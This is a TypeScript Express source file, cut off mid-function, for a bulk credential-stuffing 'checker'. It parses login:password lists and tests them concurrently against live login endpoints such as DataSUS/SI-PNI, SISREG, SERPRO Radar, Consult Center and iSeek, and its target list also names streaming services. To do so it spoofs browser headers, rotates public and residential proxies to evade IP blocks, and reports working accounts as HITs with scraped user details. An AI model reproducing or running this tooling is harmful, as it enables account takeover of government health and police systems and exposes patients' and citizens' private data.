import { Router, type IRouter } from "express";
import { createHash }  from "node:crypto";
import { execFile }    from "node:child_process";
import { unlinkSync }  from "node:fs";
import { getResidentialCreds, proxyCache } from "./proxies.js";

const router: IRouter = Router();

// ── curl-based HTTP helper ────────────────────────────────────────────────────
// Node.js's built-in fetch (undici) times out on DataSUS (cloud-IP block).
// curl uses the system network stack which has no such restriction.
// We shell out to curl for DataSUS requests only.

interface CurlResult {
  statusCode: number;
  headers:    Record<string, string>;
  body:       string;
  location:   string; // value of Location header (from redirect), if any
}

function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
  // Base args: silent + dump headers to stdout + timeout
  const args = ["-s", "--max-time", String(Math.ceil(timeoutMs / 1000)), "-D", "-", ...argv];

  return new Promise((resolve, reject) => {
    const child = execFile("curl", args, { maxBuffer: 8 * 1024 * 1024 }, (err, stdout) => {
      // curl exit-code ≠ 0 is ok as long as we got output (e.g. 302 with --max-redirs 0)
      if (!stdout && err) return reject(new Error(err.message.split("\n")[0]));

      // Split at first blank line separating headers from body
      // (may have multiple header blocks if curl followed a redirect for the GET phase)
      // We want the LAST header block.
      const blocks = stdout.split(/\r?\n\r?\n/);
      // Find last block starting with HTTP/
      let rawHdr = "";
      let body   = "";
      for (let i = blocks.length - 1; i >= 0; i--) {
        if (blocks[i].trimStart().startsWith("HTTP/")) {
          rawHdr = blocks[i];
          body   = blocks.slice(i + 1).join("\r\n\r\n");
          break;
        }
      }

      const lines      = rawHdr.split(/\r?\n/);
      const statusLine = lines[0] ?? "";
      const statusCode = parseInt(statusLine.split(" ")[1] ?? "0", 10);

      const headers: Record<string, string> = {};
      for (const line of lines.slice(1)) {
        const idx = line.indexOf(":");
        if (idx === -1) continue;
        const key = line.slice(0, idx).trim().toLowerCase();
        const val = line.slice(idx + 1).trim();
        if (!headers[key]) headers[key] = val; // first occurrence wins
      }

      resolve({ statusCode, headers, body, location: headers["location"] ?? "" });
    });

    setTimeout(() => {
      try { child.kill("SIGKILL"); } catch { /**/ }
      reject(new Error("CURL_TIMEOUT"));
    }, timeoutMs + 3_000);
  });
}

// ── Types ─────────────────────────────────────────────────────────────────────
export type CheckStatus = "HIT" | "FAIL" | "ERROR";
export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma";

export interface CheckResult {
  credential: string;
  login:      string;
  status:     CheckStatus;
  detail:     string;
}

export interface CheckerBulkResponse {
  total:   number;
  hits:    number;
  fails:   number;
  errors:  number;
  results: CheckResult[];
}

// ── Shared helpers ────────────────────────────────────────────────────────────
const MOBILE_UA  = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36";
const DESKTOP_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";

// ── Residential proxy args for curl (streaming checkers) ──────────────────────
// Streaming services block datacenter IPs — route them through residential proxy.
function getResidentialProxyArgs(): string[] {
  const c = getResidentialCreds();
  if (!c) return [];
  return ["-x", `http://${c.username}:${c.password}@${c.host}:${c.port}`];
}

// ── Retry-with-proxy helper ───────────────────────────────────────────────────
// Calls `fn(proxyArgs)` up to `maxAttempts` times, picking a fresh proxy on
// each proxy-level connection failure (curl exit-code, timeout, SOCKS error).
// Returns the first successful CurlResult (even a 4xx/5xx counts as success —
// it means the proxy connected and the server responded).
async function runCurlWithProxyRetry(
  fn:          (proxyArgs: string[]) => string[],
  timeoutMs:   number,
  maxAttempts  = 3,
): Promise<CurlResult> {
  let lastErr: Error = new Error("no_attempts");
  for (let i = 0; i < maxAttempts; i++) {
    const proxyArgs = getStreamingProxyArgs();
    try {
      return await runCurl(fn(proxyArgs), timeoutMs);
    } catch (e) {
      lastErr = e instanceof Error ? e : new Error(String(e));
      // Only retry on connection-level failures (curl exited non-zero)
      if (!lastErr.message.includes("Command failed") &&
          !lastErr.message.includes("CURL_TIMEOUT")) break;
    }
  }
  throw lastErr;
}

// ── Streaming proxy args: public SOCKS5 first, residential fallback ───────────
// Priority order:
//   1. Public SOCKS5 — tunnels HTTPS natively, no CONNECT needed
//   2. Public HTTP   — may or may not support CONNECT
//   3. Residential   — last resort (current provider blocks CONNECT for HTTPS)
function getStreamingProxyArgs(): string[] {
  const pool  = proxyCache.filter(p => !p.username);       // public proxies only
  const socks5 = pool.filter(p => p.type === "socks5");
  const http   = pool.filter(p => p.type === "http");

  // Prefer SOCKS5 — handles HTTPS without CONNECT
  const candidates = socks5.length > 0 ? socks5 : http;
  if (candidates.length > 0) {
    const top  = candidates.slice(0, 50);                   // top-50 fastest
    const pick = top[Math.floor(Math.random() * top.length)];
    // socks5h = DNS also resolved via proxy (better bypass)
    const scheme = pick.type === "socks5" ? "socks5h" : "http";
    return ["-x", `${scheme}://${pick.host}:${pick.port}`];
  }

  // No public proxies yet — fall back to residential
  return getResidentialProxyArgs();
}
const OPERA_UA   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0";

function parseCookieJar(headers: Headers): string {
  const raw = headers.getSetCookie?.() ?? [];
  return raw.map(c => c.split(";")[0]).join("; ");
}

/** Parse credentials from any format — supports email:pass, user:pass, newline/comma/semicolon separated */
export function parseCredentials(raw: string): Array<{ login: string; password: string }> {
  return raw
    .split(/[\n,;|]+/)
    .map(l => l.trim())
    .filter(Boolean)
    .map(line => {
      const idx = line.indexOf(":");
      if (idx === -1) return null;
      const login    = line.slice(0, idx).trim();
      const password = line.slice(idx + 1).trim();
      if (!login || !password) return null;
      return { login, password };
    })
    .filter((x): x is { login: string; password: string } => x !== null);
}

const sleep = (ms: number) => new Promise<void>(r => setTimeout(r, ms));

// ═══════════════════════════════════════════════════════════════════════════════
//  iSEEK CHECKER — https://iseek.pro/login
//  Logic: GET → extract CSRF _token → POST creds → check redirect location
// ═══════════════════════════════════════════════════════════════════════════════
const ISEEK_URL = "https://iseek.pro/login";
const ISEEK_TIMEOUT = 15_000;

const ISEEK_HEADERS: Record<string, string> = {
  "User-Agent":      DESKTOP_UA,
  "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
  "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
};

function extractCsrfToken(html: string): string | null {
  const m1 = html.match(/name=["']_token["'][^>]*value=["']([^"']+)["']/);
  if (m1) return m1[1];
  const m2 = html.match(/value=["']([^"']+)["'][^>]*name=["']_token["']/);
  if (m2) return m2[1];
  const m3 = html.match(/_token[^>]*value=["']([A-Za-z0-9+/=]{20,80})["']/);
  if (m3) return m3[1];
  return null;
}

async function checkIseek(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;

  // Step 1: GET login page — grab CSRF token + cookies
  let getResp: Response;
  try {
    getResp = await fetch(ISEEK_URL, {
      headers:  { ...ISEEK_HEADERS },
      redirect: "follow",
      signal:   AbortSignal.timeout(ISEEK_TIMEOUT),
    });
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
  }

  const html      = await getResp.text().catch(() => "");
  const cookieJar = parseCookieJar(getResp.headers);
  const token     = extractCsrfToken(html);

  if (!token) return { credential, login, status: "ERROR", detail: "NO_CSRF_TOKEN" };

  // Step 2: POST credentials (no redirect follow — inspect Location header)
  const body = new URLSearchParams({ _token: token, email: login, password });
  const postHeaders: Record<string, string> = {
    ...ISEEK_HEADERS,
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer":      ISEEK_URL,
    "Origin":       "https://iseek.pro",
    ...(cookieJar ? { "Cookie": cookieJar } : {}),
  };

  let postResp: Response;
  try {
    postResp = await fetch(ISEEK_URL, {
      method:   "POST",
      headers:  postHeaders,
      body:     body.toString(),
      redirect: "manual",
      signal:   AbortSignal.timeout(ISEEK_TIMEOUT),
    });
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
  }

  if (postResp.status >= 301 && postResp.status <= 308) {
    const loc = postResp.headers.get("location") ?? "";
    if (loc && !loc.includes("/login")) {
      return { credential, login, status: "HIT", detail: loc.startsWith("/") ? `https://iseek.pro${loc}` : loc };
    }
    return { credential, login, status: "FAIL", detail: loc || "redirect_back_to_login" };
  }

  // Fallback: follow redirects and check final URL
  try {
    const final = await fetch(ISEEK_URL, {
      method:   "POST",
      headers:  postHeaders,
      body:     body.toString(),
      redirect: "follow",
      signal:   AbortSignal.timeout(ISEEK_TIMEOUT),
    });
    const finalUrl = final.url;
    if (finalUrl && !finalUrl.includes("/login")) {
      return { credential, login, status: "HIT", detail: finalUrl };
    }
    return { credential, login, status: "FAIL", detail: finalUrl || "login_page" };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `POST_FOLLOW:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  DATASUS / SI-PNI CHECKER — https://sipni.datasus.gov.br
//  Logic: GET page → extract ViewState + form ID → SHA-512 password → POST → check
// ═══════════════════════════════════════════════════════════════════════════════
const DATASUS_URL = "https://sipni.datasus.gov.br/si-pni-web/faces/inicio.jsf";
const DATASUS_TIMEOUT = 15_000;

const DATASUS_HEADERS: Record<string, string> = {
  "User-Agent": MOBILE_UA,
  "Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
};

function sha512(text: string): string {
  return createHash("sha512").update(text, "ascii").digest("hex");
}

function sha256(text: string): string {
  return createHash("sha256").update(text).digest("hex");
}

function extractViewState(html: string): string {
  // Standard JSF ViewState hidden input
  const m = html.match(/name=["']javax\.faces\.ViewState["'][^>]*value=["']([^"']+)["']/);
  if (m) return m[1];
  const m2 = html.match(/value=["']([^"']+)["'][^>]*name=["']javax\.faces\.ViewState["']/);
  if (m2) return m2[1];
  return "j_id1"; // fallback default
}

function extractFormId(html: string): string {
  // Try known form IDs: j_idt23, j_idt26, etc.
  const knownIds = ["j_idt23", "j_idt26", "loginForm", "j_idt25", "j_idt24"];
  for (const id of knownIds) {
    if (html.includes(`id="${id}"`)) return id;
  }
  // Fallback: first form with an id
  const m = html.match(/<form[^>]+id=["']([^"']+)["']/);
  if (m) return m[1];
  return "j_idt23";
}

function extractSubmitId(html: string, formId: string): string {
  // Try to find submit button inside the form
  const m = html.match(new RegExp(`${formId}:([\\w]+)[^>]+type=["']submit["']`));
  if (m) return `${formId}:${m[1]}`;
  const m2 = html.match(/id=["']([^"']+)["'][^>]*type=["']submit["']/);
  if (m2) return m2[1];
  return `${formId}:j_idt32`; // default fallback from Python code
}

async function checkDataSUS(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  // Unique cookie jar per session so parallel checks don't share cookies
  const cookieFile = `/tmp/datasus_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  try {
    // ── Step 1: GET login page, save cookies ──────────────────────────────
    let getResult: CurlResult;
    try {
      getResult = await runCurl([
        "-c", cookieFile,                    // save cookies to jar
        "-H", `User-Agent: ${MOBILE_UA}`,
        DATASUS_URL,
      ], DATASUS_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
    }

    if (getResult.statusCode !== 200) {
      return { credential, login, status: "ERROR", detail: `HTTP_${getResult.statusCode}` };
    }

    const html      = getResult.body;
    const viewState = extractViewState(html);
    const formId    = extractFormId(html);
    const submitId  = extractSubmitId(html, formId);
    const senhaHash = sha512(password);

    // Build POST body
    const postPairs = [
      [formId, formId],
      ["javax.faces.ViewState", viewState],
      [`${formId}:usuario`, login],
      [`${formId}:senha`, senhaHash],
      [submitId, submitId.includes(":") ? submitId.split(":")[1] : submitId],
    ];
    // Escape each value for shell single-quote safety
    const postData = postPairs
      .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
      .join("&");

    // ── Step 2: POST (no redirect follow — inspect Location header) ────────
    let postResult: CurlResult;
    try {
      postResult = await runCurl([
        "-b", cookieFile,                                    // send cookies from jar
        "-H", `User-Agent: ${MOBILE_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "Origin: https://sipni.datasus.gov.br",
        "-H", `Referer: ${DATASUS_URL}`,
        "--data-raw", postData,                              // POST body (no shell quoting issues)
        "--max-redirs", "0",                                 // inspect Location header manually
        DATASUS_URL,
      ], DATASUS_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
    }

    // 302 redirect away from inicio.jsf = LIVE
    const code = postResult.statusCode;
    const loc  = postResult.location;
    if (code >= 301 && code <= 308) {
      if (loc && !loc.includes("inicio.jsf")) {
        return { credential, login, status: "HIT", detail: loc };
      }
      return { credential, login, status: "FAIL", detail: "redirect_back_to_login" };
    }

    // No redirect — check body keywords
    const body2 = postResult.body.toLowerCase();
    if (body2.includes("usu") && (body2.includes("ou senha inv") || body2.includes("senha incorreta"))) {
      return { credential, login, status: "FAIL", detail: "senha_invalida" };
    }
    if (body2.includes("pacienteform") || body2.includes("listapacientetable") || body2.includes("bem-vindo")) {
      return { credential, login, status: "HIT", detail: "dashboard_found" };
    }
    if (body2.includes("inicio.jsf") || body2.includes('type="password"') || body2.includes("type='password'")) {
      return { credential, login, status: "FAIL", detail: "still_on_login" };
    }

    return { credential, login, status: "ERROR", detail: `UNKNOWN_HTTP${code}` };
  } finally {
    // Clean up cookie jar
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SERPRO CHECKER — https://radar.serpro.gov.br
//  Logic: POST JSON with Android UA → check response for "token" field
//  Note: API uses self-signed cert; curl -k skips verification.
// ═══════════════════════════════════════════════════════════════════════════════
const SERPRO_URL     = "https://radar.serpro.gov.br/core-rest/gip-rest/auth/loginTalonario";
const SERPRO_TIMEOUT = 15_000;
const SERPRO_UA      = "Dalvik/2.1.0 (Linux; Android 14)";

async function checkSerpro(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const body       = JSON.stringify({ imei: "", latitude: 0, longitude: 0, password, username: login });

  try {
    const result = await runCurl([
      "-k", "--compressed",                            // ignore self-signed cert + auto-decompress gzip
      "-X", "POST",
      "-H", `User-Agent: ${SERPRO_UA}`,
      "-H", "Connection: Keep-Alive",
      "-H", "Content-Type: application/json",
      "-d", body,
      SERPRO_URL,
    ], SERPRO_TIMEOUT);

    const text = result.body.trim();

    // Empty or non-JSON (WAF block / gateway error)
    if (!text || result.statusCode === 0 || result.statusCode >= 502) {
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
    }

    // WAF / firewall rejection (HTML response instead of JSON)
    if (text.startsWith("<") || text.includes("Request Rejected") || text.includes("<html")) {
      return { credential, login, status: "ERROR", detail: "WAF_BLOCKED" };
    }

    let json: Record<string, unknown>;
    try { json = JSON.parse(text); } catch { return { credential, login, status: "ERROR", detail: "INVALID_JSON" }; }

    // HIT: response contains a JWT token
    if (json.token && typeof json.token === "string") {
      return { credential, login, status: "HIT", detail: "token_ok" };
    }

    // Expired / blocked account (has stok but no token)
    if (json.stok) {
      return { credential, login, status: "FAIL", detail: `stok_code_${json.code ?? "?"}` };
    }

    // Parse friendly message from API response
    const mensagem = String(json.mensagem ?? json.message ?? json.erro ?? "").trim();

    // Explicit error codes
    const code = String(json.code ?? json.status ?? "").toLowerCase();
    if (code.includes("invalid") || code.includes("wrong") || code.includes("401")) {
      return { credential, login, status: "FAIL", detail: mensagem || `auth_failed:${code}` };
    }

    if (result.statusCode === 401 || result.statusCode === 403) {
      return { credential, login, status: "FAIL", detail: mensagem || `http_${result.statusCode}` };
    }

    // User not found or other API error = FAIL
    if (mensagem) {
      return { credential, login, status: "FAIL", detail: mensagem.slice(0, 100) };
    }

    return { credential, login, status: "FAIL", detail: text.slice(0, 120) };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `SERPRO_EXCEPTION:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SISREG III CHECKER — https://sisregiii.saude.gov.br
//  Logic: POST SHA-256 hashed password → parse HTML for profile markers
// ═══════════════════════════════════════════════════════════════════════════════
const SISREG_URL     = "https://sisregiii.saude.gov.br/";
const SISREG_TIMEOUT = 20_000;

async function checkSisreg(login: string, password: string): Promise<CheckResult> {
  const credential  = `${login}:${password}`;
  const senhaHash   = sha256(password);

  const postBody = [
    `usuario=${encodeURIComponent(login)}`,
    `senha=`,
    `senha_256=${senhaHash}`,
    `etapa=ACESSO`,
    `logout=`,
  ].join("&");

  try {
    const result = await runCurl([
      "-k", "--compressed",
      "-X", "POST",
      "-H", "Host: sisregiii.saude.gov.br",
      "-H", "Connection: keep-alive",
      "-H", "Cache-Control: max-age=0",
      "-H", `sec-ch-ua: "Not A(Brand";v="99", "Opera";v="107", "Chromium";v="121"`,
      "-H", "sec-ch-ua-mobile: ?0",
      "-H", `sec-ch-ua-platform: "Windows"`,
      "-H", "Upgrade-Insecure-Requests: 1",
      "-H", `Origin: ${SISREG_URL}`,
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "-H", `User-Agent: ${OPERA_UA}`,
      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "-H", "Sec-Fetch-Site: same-origin",
      "-H", "Sec-Fetch-Mode: navigate",
      "-H", "Sec-Fetch-User: ?1",
      "-H", "Sec-Fetch-Dest: document",
      "-H", `Referer: ${SISREG_URL}cgi-bin/index?logout=1`,
      "-H", "Accept-Language: pt-BR,pt;q=0.9",
      "--data-raw", postBody,
      `${SISREG_URL}`,
    ], SISREG_TIMEOUT);

    if (result.statusCode === 0 || result.statusCode >= 502) {
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
    }

    const body = result.body;

    // ── Capture LIMITADO message <CENTER><font color="red"><B>...</B> ─────────
    const limitadoMatch = body.match(/<CENTER><font[^>]*color=["']?red["']?[^>]*><B>(.*?)<\/B>/i);
    const limitado = limitadoMatch ? limitadoMatch[1].trim().slice(0, 80) : null;

    // ── Capture UNIDADE ────────────────────────────────────────────────────────
    const unidadeMatch = body.match(/Unidade:[\s\S]{0,200}?&nbsp;([^<]+)<\/font>/) ||
                         body.match(/Unidade:(.*?)<\/[Dd][Ii][Vv]>/);
    const unidade = unidadeMatch
      ? unidadeMatch[1].replace(/&nbsp;/g, " ").replace(/<[^>]+>/g, "").trim().slice(0, 80)
      : null;

    const extraInfo = [unidade ? `Unidade: ${unidade}` : null, limitado ? `Msg: ${limitado}` : null]
      .filter(Boolean).join(" | ");

    // ── FAIL markers ──────────────────────────────────────────────────────────
    if (body.includes("Login ou senha incorreto(s).")) {
      return { credential, login, status: "FAIL", detail: limitado ? `senha_invalida | ${limitado}` : "senha_invalida" };
    }
    if (body.includes("Este operador foi desativado pelo administrador.")) {
      return { credential, login, status: "FAIL", detail: extraInfo || "conta_desativada" };
    }

    // ── CUSTOM: access restricted by day/time — account IS valid ─────────────
    if (body.includes("Acesso n") && body.includes("o permitido")) {
      return { credential, login, status: "HIT", detail: extraInfo || "acesso_restrito" };
    }

    // ── HIT markers ───────────────────────────────────────────────────────────
    const hitMarkers = ["<p>Perfil</p>", "logout", "Sair", "Principal", "Cadastro"];
    const isHit = hitMarkers.some(m => body.includes(m));
    if (isHit) {
      return { credential, login, status: "HIT", detail: extraInfo || "login_ok" };
    }

    // ── Fallback ──────────────────────────────────────────────────────────────
    if (body.length < 500) {
      return { credential, login, status: "ERROR", detail: "resposta_muito_curta" };
    }

    return { credential, login, status: "FAIL", detail: extraInfo || "nenhum_marcador" };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `SISREG_EXCEPTION:${String(e)}` };
  }
}

// ── Concurrency pool (no deps needed) ────────────────────────────────────────
// Runs `fn` for every item with at most `concurrency` tasks in parallel,
// preserving result order. Fast replacement for p-limit.
// Each worker catches unexpected throws so the pool NEVER stops early.
async function pMap<T, R>(
  items:       T[],
  fn:          (item: T, idx: number) => Promise<R>,
  concurrency: number,
  onResult?:   (result: R, index: number) => void,
): Promise<R[]> {
  const results: R[] = new Array(items.length);
  let next = 0;
  let done = 0;
  const worker = async () => {
    while (next < items.length) {
      const i = next++;
      try {
        results[i] = await fn(items[i], i);
      } catch (e) {
        // Safety net — mappers should never throw, but if they do the pool continues
        const item = items[i] as Record<string, string>;
        const login = item.login ?? "unknown";
        const pw    = item.password ?? "";
        results[i]  = { credential: `${login}:${pw}`, login, status: "ERROR", detail: `UNCAUGHT:${String(e)}` } as R;
      }
      done++;
      onResult?.(results[i], done);
    }
  };
  await Promise.all(Array.from({ length: Math.min(concurrency, items.length) }, worker));
  return results;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  CONSULT CENTER CHECKER — https://sistema.consultcenter.com.br/users/login
//  Logic: GET page → grab CAKEPHP session cookie → POST creds → detect error/success
// ═══════════════════════════════════════════════════════════════════════════════
const CC_URL     = "https://sistema.consultcenter.com.br/users/login";
const CC_TIMEOUT = 20_000;

async function checkConsultCenter(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/cc_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  // Extracts rich detail from the dashboard HTML after a successful login
  const extractCCDetail = (html: string): string => {
    const h = html.toLowerCase();
    // Senha expirada / troca forçada
    if (h.includes("alterar senha") || h.includes("redefinir senha") ||
        h.includes("senha expirada") || h.includes("sua senha expirou") ||
        h.includes("password expired") || h.includes("change your password") ||
        h.includes("trocar senha") || h.includes("atualizar senha")) {
      return "SENHA_EXPIRADA — conta válida, troca obrigatória";
    }
    // Conta bloqueada/inativa mas com credenciais corretas
    if (h.includes("conta inativa") || h.includes("usuário inativo") ||
        h.includes("acesso bloqueado") || h.includes("sem permissão") ||
        h.includes("sem permissao")) {
      return "CONTA_BLOQUEADA";
    }
    // Extrair nome do usuário
    const namePatterns = [
      /Bem[- ]vindo[,\s]+a?o?\s+([^<\n,!]{2,50})/i,
      /Olá[,\s]+([^<\n,!]{2,50})/i,
      /Ola[,\s]+([^<\n,!]{2,50})/i,
      /class="[^"]*username[^"]*"[^>]*>\s*([^<]{2,50})/i,
      /class="[^"]*user-name[^"]*"[^>]*>\s*([^<]{2,50})/i,
    ];
    for (const re of namePatterns) {
      const m = html.match(re);
      if (m) return `logado:${m[1].trim().slice(0, 60)}`;
    }
    return "dashboard_ok";
  };

  try {
    // ── Step 1: GET login page — obtain session cookie ─────────────────────
    let getResult: CurlResult;
    try {
      getResult = await runCurl([
        "-c", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
        CC_URL,
      ], CC_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
    }

    if (getResult.statusCode === 0 || getResult.statusCode >= 500) {
      return { credential, login, status: "ERROR", detail: `GET_HTTP_${getResult.statusCode}` };
    }

    // ── Step 2: POST credentials — follow redirects to final page ──────────
    const postBody = [
      `_method=POST`,
      `data%5BUsuarioLogin%5D%5Busername%5D=${encodeURIComponent(login)}`,
      `data%5BUsuarioLogin%5D%5Bpassword%5D=${encodeURIComponent(password)}`,
    ].join("&");

    let postResult: CurlResult;
    try {
      postResult = await runCurl([
        "-b", cookieFile, "-c", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
        "-H", `Referer: ${CC_URL}`,
        "-H", "Origin: https://sistema.consultcenter.com.br",
        "--data-raw", postBody,
        "-L", "--max-redirs", "5",  // follow redirects — land on dashboard
        CC_URL,
      ], CC_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
    }

    const body = postResult.body;
    const bLow = body.toLowerCase();

    // ── FAIL: explicit error flash (still on login page) ───────────────────
    if (body.includes("alert-danger") || body.includes("incorretos") ||
        body.includes("Usuário e senha") || body.includes("Login ou Senha")) {
      return { credential, login, status: "FAIL", detail: "credentials_invalid" };
    }
    if (bLow.includes("usuário não encontrado") || bLow.includes("usuario nao encontrado")) {
      return { credential, login, status: "FAIL", detail: "usuario_nao_encontrado" };
    }

    // ── HIT: landed on a post-login page ───────────────────────────────────
    const isOnLogin = bLow.includes("/users/login") && bLow.includes('type="password"');
    if (!isOnLogin) {
      // Check for forced password change page — still a HIT (login worked)
      const hLow = bLow;
      if (hLow.includes("alterar senha") || hLow.includes("redefinir senha") ||
          hLow.includes("senha expirada") || hLow.includes("sua senha expirou") ||
          hLow.includes("trocar senha") || hLow.includes("atualizar senha")) {
        return { credential, login, status: "HIT", detail: "SENHA_EXPIRADA — conta válida, troca obrigatória" };
      }
      if (body.includes("Bem-vindo") || body.includes("Sair") || body.includes("logout") ||
          body.includes("Dashboard") || body.includes("dashboard") || body.includes("Painel")) {
        return { credential, login, status: "HIT", detail: extractCCDetail(body) };
      }
      // Post-redirect 200 with session but no obvious markers — likely authenticated
      if (postResult.statusCode === 200 && body.length > 2000) {
        return { credential, login, status: "HIT", detail: extractCCDetail(body) };
      }
    }

    return { credential, login, status: "FAIL", detail: "unknown_response" };
  } finally {
    try { unlinkSync(cookieFile); } catch { /* ok */ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  MIND-7 CHECKER — https://mind-7.org/acesso/
//  Note: site is behind Cloudflare managed JS challenge (not bypassed via curl).
//  All attempts will return ERROR:CLOUDFLARE_CHALLENGE.
// ═══════════════════════════════════════════════════════════════════════════════
const MIND7_URL     = "https://mind-7.org/acesso/";
const MIND7_TIMEOUT = 15_000;

async function checkMind7(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/m7_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  try {
    let getResult: CurlResult;
    try {
      getResult = await runCurl([
        "-c", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
        "-H", "Sec-CH-UA: \"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\"",
        "-H", "Sec-CH-UA-Mobile: ?0",
        "-H", "Sec-CH-UA-Platform: \"Windows\"",
        "-H", "Sec-Fetch-Dest: document",
        "-H", "Sec-Fetch-Mode: navigate",
        "-H", "Sec-Fetch-Site: none",
        MIND7_URL,
      ], MIND7_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
    }

    // Detect Cloudflare challenge
    const isCFChallenge =
      getResult.statusCode === 403 ||
      getResult.statusCode === 503 ||
      getResult.body.includes("_cf_chl_opt") ||
      getResult.body.includes("cf-mitigated") ||
      getResult.body.includes("Just a moment") ||
      getResult.body.includes("Enable JavaScript and cookies");

    if (isCFChallenge) {
      return { credential, login, status: "ERROR", detail: "CLOUDFLARE_CHALLENGE" };
    }

    // If we somehow got past CF, try to POST
    const postBody = `username=${encodeURIComponent(login)}&password=${encodeURIComponent(password)}`;
    let postResult: CurlResult;
    try {
      postResult = await runCurl([
        "-b", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", `Referer: ${MIND7_URL}`,
        "-H", "Origin: https://mind-7.org",
        "--data-raw", postBody,
        "--max-redirs", "5",
        MIND7_URL,
      ], MIND7_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
    }

    const loc = postResult.location;
    if (loc && !loc.includes("/acesso") && !loc.includes("/login")) {
      return { credential, login, status: "HIT", detail: loc };
    }
    return { credential, login, status: "FAIL", detail: "credentials_invalid" };
  } finally {
    try { unlinkSync(cookieFile); } catch { /* ok */ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SIPNI CHECKER (v2) — https://sipni.datasus.gov.br (4-step JSF AJAX flow)
//  Logic: GET page → partial AJAX POST 1 → update ViewState → partial AJAX POST 2
//         → follow redirect XML → GET pacientes page → verify markers
// ═══════════════════════════════════════════════════════════════════════════════
const SIPNI_URL          = "https://sipni.datasus.gov.br/si-pni-web/faces/inicio.jsf";
const SIPNI_PACIENTES    = "https://sipni.datasus.gov.br/si-pni-web/faces/paciente/listarPaciente.jsf";
const SIPNI_TIMEOUT      = 25_000;

async function checkSipni(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/sipni_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  try {
    // ── Step 1: GET login page ────────────────────────────────────────────────
    let getResult: CurlResult;
    try {
      getResult = await runCurl([
        "-k", "--compressed",
        "-c", cookieFile,
        "-H", `User-Agent: ${MOBILE_UA}`,
        "-H", "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "-H", "Connection: keep-alive",
        "-H", "DNT: 1",
        SIPNI_URL,
      ], SIPNI_TIMEOUT);
    } catch (e) {
